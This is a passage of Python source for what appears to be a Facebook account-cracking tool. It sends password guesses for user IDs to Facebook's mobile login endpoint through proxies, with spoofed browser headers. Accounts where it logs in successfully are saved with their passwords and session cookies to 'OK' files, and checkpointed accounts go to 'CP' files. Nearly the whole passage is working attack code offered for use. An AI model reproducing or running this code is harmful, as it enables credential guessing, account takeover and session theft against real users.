E0%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&rtime=1691708019&hrc=1&wtsid=rdr_0DU97QlYDCyA332wq&_rdr')
			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":idf,"next":"https://m.facebook.com/v11.0/dialog/oauth?client_id=209104039103989&scope=email&response_type=code&redirect_uri=https%3A%2F%2Fasia-identity.oriflame.com%2Fsignin-facebook&state=CfDJ8LvpYsQMXrtMh3GSiSxS193LRnY1qX_Oua8sXfjpqEeUXIdSdb5drE6jHgpjdD-gpqBl_uZmCtMlZe1p7xqrjZ7R0Eini0h01r3FiqJlAOf9GbWkP-ZAoCPzzmg7cBA2DNmjDAE9DonOueviwbbetQvCdI0TrgjgK4QIZkYfD4nNG3E4k6PcEveh-Nz6iVTgsvnohkzBJj9lJEjvw_d2_l3pOh0pmnTiG4wWtL3iDmb2HAO3liAefemcJynqN7bbmo04MOpljArC8YamWCPCnOraxpmc5EV0tt5DcZkPQgZ8ZYt_ErAze6y-dXtXBJAf7vxOpTZN2jWUKOZEn84OsVD7TtwY8XQCYXjar1s2pfsc5Z-Tp2p_zb06CX_o5UqzcESa6UiyuErGvUNA6zv0uJQbFfHfxfcKou3fFaw6pn2ohtoQK5Nlz-86z-7evzUmjfTp0v9Irl6gf1WaSVZ7C5RlzXPEhAuzzQukUC7Xk7DjjlG9pSln1efpYzY7R82tSDQh0lDpaHFIviAubLokK1q866Jsm2NP0r3jLV-eHeZk4FkMtvPR5gbN9gDYI52G0BSNCuk2ioYXVw2iFPh9_kxjbUrllZj5MIBTVfaifUs3jhFSzHLCcxlDCtC9IunXK7HZ5BsU0rj9re8GQCiiNklCDJBlaYTdosPpLnJYRMkMgdZf9YrX3HweidJqAuDQUATQ8Oc1f9FSTTXgYv-L2XMDz5yqrB4ZYWBBcr-jj5TCDDN_LdSA_XiFC-UBCs9AKROvMKp6ZsaG-Sp8avt2uhrVBHtGarzNEqovDlMSdP-SkqM4gbImArATmLJfE6W4I9J6yDWERBzjDi4gh3eTPuHxDPw1Fq2idAL0mSei0xcRUO2wNRDEOE1MgHTqqrOHRfCPrX6Kv9u6o1LWp0C_NWteEzpP6NTZmBnKO_c2SC7DIdWLYxNK70oBGRIQtJsXrqyvKgHCmJGTV-fenK1iTnCSeRA6NSNwGHeZyDvSpqfV4rCdz7_BP7_05Gp12N96mna3-Ii53_1MSoHjwrN2AGOvcMC_Wd0RKS93ajLkpumX47ghw78x6o0RyWkpjCWAVw6IYBtwPZiFmRMDrVALioUseiVK8B42cJ8RV_26hO7xPdf-2DY1RbyGtPW-S2LTiRRe5KT3mgep7_fbhDSDKT0kx70C_Wa_xlfuJPMr6a03C6-U_RIEr4t6qov9BJ2dNDOJmPlVgilc3EOPAFwWjV9Y01XSs6csSUHmXMfU1L0kVs4ahi3fX7lMV7Q-jrxU-VLdNXg7atC1IWy5-p-SOMgExweS3sIEoVYi_3Yqt8Kn6qgYTAQWNbxVJeAANb_rDf7N851mRfc_A4JC-zUXL4l9gbVS6_pfS6atQIdJgtAJlEuqlZDB3uDoQyee4yljHBN2XJCOQsN6l1gfvjqaSLlzPwHvWsMayMkXkFpEh8MqAK2Ahj_XfYtiSwc0mhWHZcDFdGBd46uq4SSJbhDXWSt20ZHUS9ME2lpQGk7kP7xvvyRYI0Vc7OQUnWQD9d6GXw8pjbgxfn2tu1q-VJzL_UK70T92sBM0pgp4qoxnm4x6rITxGThpISTvIqhsHiVaiSOj9lGVG0ZrJpbm-ZtcMzrNeTS1oVyhIp0jCkbCo19lS0LViHJrnOxSFwS6n4fgIirv0cLLJ6dtPJ7K1GxurWTMe0otxjIucBjRTEEmc80CBhuwRNNPmE4nJ-fZkoVKZJRvOu5UJ-ktn5GCXRZo4JQzXOck_gOrEqUcEaLImUCPgmWiIYLr6RUSx8zCGyoLZbzkYg315HnMLo5l552xFqQ48qayy531Lkm94BQOKNLAFXbqEavFgsoJWhDFPKPRZMROgnMl-bdamTL2rSOEHE0&ret=login&fbapp_pres=0&logger_id=b1f44a2c-9d4b-43ed-a467-d0c10dc970f5&tp=unspecified","flow":"login_no_pin","pass":pw,}
			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
			koki+=' m_pixel_ratio=2.625; wd=412x756'
			heade={'Host': 'mbasic.facebook.com','cache-control': 'max-age=0','sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="98"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','upgrade-insecure-requests': '1','origin': 'https://mbasic.facebook.com','content-type': 'application/x-www-form-urlencoded','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','x-requested-with': 'XMLHttpRequest','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','referer': 'https://mbasic.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&next=https%3A%2F%2Fm.facebook.com%2Fv11.0%2Fdialog%2Foauth%3Fclient_id%3D209104039103989%26scope%3Demail%26response_type%3Dcode%26redirect_uri%3Dhttps%253A%252F%252Fasia-identity.oriflame.com%252Fsignin-facebook%26state%3DCfDJ8LvpYsQMXrtMh3GSiSxS193LRnY1qX_Oua8sXfjpqEeUXIdSdb5drE6jHgpjdD-gpqBl_uZmCtMlZe1p7xqrjZ7R0Eini0h01r3FiqJlAOf9GbWkP-ZAoCPzzmg7cBA2DNmjDAE9DonOueviwbbetQvCdI0TrgjgK4QIZkYfD4nNG3E4k6PcEveh-Nz6iVTgsvnohkzBJj9lJEjvw_d2_l3pOh0pmnTiG4wWtL3iDmb2HAO3liAefemcJynqN7bbmo04MOpljArC8YamWCPCnOraxpmc5EV0tt5DcZkPQgZ8ZYt_ErAze6y-dXtXBJAf7vxOpTZN2jWUKOZEn84OsVD7TtwY8XQCYXjar1s2pfsc5Z-Tp2p_zb06CX_o5UqzcESa6UiyuErGvUNA6zv0uJQbFfHfxfcKou3fFaw6pn2ohtoQK5Nlz-86z-7evzUmjfTp0v9Irl6gf1WaSVZ7C5RlzXPEhAuzzQukUC7Xk7DjjlG9pSln1efpYzY7R82tSDQh0lDpaHFIviAubLokK1q866Jsm2NP0r3jLV-eHeZk4FkMtvPR5gbN9gDYI52G0BSNCuk2ioYXVw2iFPh9_kxjbUrllZj5MIBTVfaifUs3jhFSzHLCcxlDCtC9IunXK7HZ5BsU0rj9re8GQCiiNklCDJBlaYTdosPpLnJYRMkMgdZf9YrX3HweidJqAuDQUATQ8Oc1f9FSTTXgYv-L2XMDz5yqrB4ZYWBBcr-jj5TCDDN_LdSA_XiFC-UBCs9AKROvMKp6ZsaG-Sp8avt2uhrVBHtGarzNEqovDlMSdP-SkqM4gbImArATmLJfE6W4I9J6yDWERBzjDi4gh3eTPuHxDPw1Fq2idAL0mSei0xcRUO2wNRDEOE1MgHTqqrOHRfCPrX6Kv9u6o1LWp0C_NWteEzpP6NTZmBnKO_c2SC7DIdWLYxNK70oBGRIQtJsXrqyvKgHCmJGTV-fenK1iTnCSeRA6NSNwGHeZyDvSpqfV4rCdz7_BP7_05Gp12N96mna3-Ii53_1MSoHjwrN2AGOvcMC_Wd0RKS93ajLkpumX47ghw78x6o0RyWkpjCWAVw6IYBtwPZiFmRMDrVALioUseiVK8B42cJ8RV_26hO7xPdf-2DY1RbyGtPW-S2LTiRRe5KT3mgep7_fbhDSDKT0kx70C_Wa_xlfuJPMr6a03C6-U_RIEr4t6qov9BJ2dNDOJmPlVgilc3EOPAFwWjV9Y01XSs6csSUHmXMfU1L0kVs4ahi3fX7lMV7Q-jrxU-VLdNXg7atC1IWy5-p-SOMgExweS3sIEoVYi_3Yqt8Kn6qgYTAQWNbxVJeAANb_rDf7N851mRfc_A4JC-zUXL4l9gbVS6_pfS6atQIdJgtAJlEuqlZDB3uDoQyee4yljHBN2XJCOQsN6l1gfvjqaSLlzPwHvWsMayMkXkFpEh8MqAK2Ahj_XfYtiSwc0mhWHZcDFdGBd46uq4SSJbhDXWSt20ZHUS9ME2lpQGk7kP7xvvyRYI0Vc7OQUnWQD9d6GXw8pjbgxfn2tu1q-VJzL_UK70T92sBM0pgp4qoxnm4x6rITxGThpISTvIqhsHiVaiSOj9lGVG0ZrJpbm-ZtcMzrNeTS1oVyhIp0jCkbCo19lS0LViHJrnOxSFwS6n4fgIirv0cLLJ6dtPJ7K1GxurWTMe0otxjIucBjRTEEmc80CBhuwRNNPmE4nJ-fZkoVKZJRvOu5UJ-ktn5GCXRZo4JQzXOck_gOrEqUcEaLImUCPgmWiIYLr6RUSx8zCGyoLZbzkYg315HnMLo5l552xFqQ48qayy531Lkm94BQOKNLAFXbqEavFgsoJWhDFPKPRZMROgnMl-bdamTL2rSOEHE0%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3Db1f44a2c-9d4b-43ed-a467-d0c10dc970f5%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fasia-identity.oriflame.com%2Fsignin-facebook%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3DCfDJ8LvpYsQMXrtMh3GSiSxS193LRnY1qX_Oua8sXfjpqEeUXIdSdb5drE6jHgpjdD-gpqBl_uZmCtMlZe1p7xqrjZ7R0Eini0h01r3FiqJlAOf9GbWkP-ZAoCPzzmg7cBA2DNmjDAE9DonOueviwbbetQvCdI0TrgjgK4QIZkYfD4nNG3E4k6PcEveh-Nz6iVTgsvnohkzBJj9lJEjvw_d2_l3pOh0pmnTiG4wWtL3iDmb2HAO3liAefemcJynqN7bbmo04MOpljArC8YamWCPCnOraxpmc5EV0tt5DcZkPQgZ8ZYt_ErAze6y-dXtXBJAf7vxOpTZN2jWUKOZEn84OsVD7TtwY8XQCYXjar1s2pfsc5Z-Tp2p_zb06CX_o5UqzcESa6UiyuErGvUNA6zv0uJQbFfHfxfcKou3fFaw6pn2ohtoQK5Nlz-86z-7evzUmjfTp0v9Irl6gf1WaSVZ7C5RlzXPEhAuzzQukUC7Xk7DjjlG9pSln1efpYzY7R82tSDQh0lDpaHFIviAubLokK1q866Jsm2NP0r3jLV-eHeZk4FkMtvPR5gbN9gDYI52G0BSNCuk2ioYXVw2iFPh9_kxjbUrllZj5MIBTVfaifUs3jhFSzHLCcxlDCtC9IunXK7HZ5BsU0rj9re8GQCiiNklCDJBlaYTdosPpLnJYRMkMgdZf9YrX3HweidJqAuDQUATQ8Oc1f9FSTTXgYv-L2XMDz5yqrB4ZYWBBcr-jj5TCDDN_LdSA_XiFC-UBCs9AKROvMKp6ZsaG-Sp8avt2uhrVBHtGarzNEqovDlMSdP-SkqM4gbImArATmLJfE6W4I9J6yDWERBzjDi4gh3eTPuHxDPw1Fq2idAL0mSei0xcRUO2wNRDEOE1MgHTqqrOHRfCPrX6Kv9u6o1LWp0C_NWteEzpP6NTZmBnKO_c2SC7DIdWLYxNK70oBGRIQtJsXrqyvKgHCmJGTV-fenK1iTnCSeRA6NSNwGHeZyDvSpqfV4rCdz7_BP7_05Gp12N96mna3-Ii53_1MSoHjwrN2AGOvcMC_Wd0RKS93ajLkpumX47ghw78x6o0RyWkpjCWAVw6IYBtwPZiFmRMDrVALioUseiVK8B42cJ8RV_26hO7xPdf-2DY1RbyGtPW-S2LTiRRe5KT3mgep7_fbhDSDKT0kx70C_Wa_xlfuJPMr6a03C6-U_RIEr4t6qov9BJ2dNDOJmPlVgilc3EOPAFwWjV9Y01XSs6csSUHmXMfU1L0kVs4ahi3fX7lMV7Q-jrxU-VLdNXg7atC1IWy5-p-SOMgExweS3sIEoVYi_3Yqt8Kn6qgYTAQWNbxVJeAANb_rDf7N851mRfc_A4JC-zUXL4l9gbVS6_pfS6atQIdJgtAJlEuqlZDB3uDoQyee4yljHBN2XJCOQsN6l1gfvjqaSLlzPwHvWsMayMkXkFpEh8MqAK2Ahj_XfYtiSwc0mhWHZcDFdGBd46uq4SSJbhDXWSt20ZHUS9ME2lpQGk7kP7xvvyRYI0Vc7OQUnWQD9d6GXw8pjbgxfn2tu1q-VJzL_UK70T92sBM0pgp4qoxnm4x6rITxGThpISTvIqhsHiVaiSOj9lGVG0ZrJpbm-ZtcMzrNeTS1oVyhIp0jCkbCo19lS0LViHJrnOxSFwS6n4fgIirv0cLLJ6dtPJ7K1GxurWTMe0otxjIucBjRTEEmc80CBhuwRNNPmE4nJ-fZkoVKZJRvOu5UJ-ktn5GCXRZo4JQzXOck_gOrEqUcEaLImUCPgmWiIYLr6RUSx8zCGyoLZbzkYg315HnMLo5l552xFqQ48qayy531Lkm94BQOKNLAFXbqEavFgsoJWhDFPKPRZMROgnMl-bdamTL2rSOEHE0%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&rtime=1691708019&hrc=1&wtsid=rdr_0DU97QlYDCyA332wq&_rdr','accept-encoding': 'gzip, deflate, br','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
			po = ses.post('https://mbasic.facebook.com/login/device-based/validate-password/?shbl=0&locale2=id_ID',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False,proxies=proxs)
			if "checkpoint" in po.cookies.get_dict().keys():
				tree = Tree(f" ")
				tree.add(f"[bold yellow]{idf}")
				tree.add(f"[bold yellow]{pw}").add(f"[bold yellow]{ua}{P}")
				tri(tree)
				open('CP/'+cpx,'a').write(idf+'|'+pw+'\n')
				akun.append(idf+'|'+pw)
				cp+=1
				break
			elif "c_user" in po.cookies.get_dict().keys():
				ok+=1
				coki=po.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				tree = Tree(f" ")
				tree.add(f"[bold green]{idf}")
				tree.add(f"[bold green]{pw}")
				tree.add(f"[bold green]{kuki}").add(f"[green]{ua}{P}")
				tri(tree)
				open('OK/'+okx,'a').write(idf+'|'+pw+'|'+kuki+'\n')
				cek_apk(session,coki)
				break
				
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1


if __name__=='__main__':
	try:os.mkdir('OK')
	except:pass
	try:os.mkdir('CP')
	except:pass
	key()
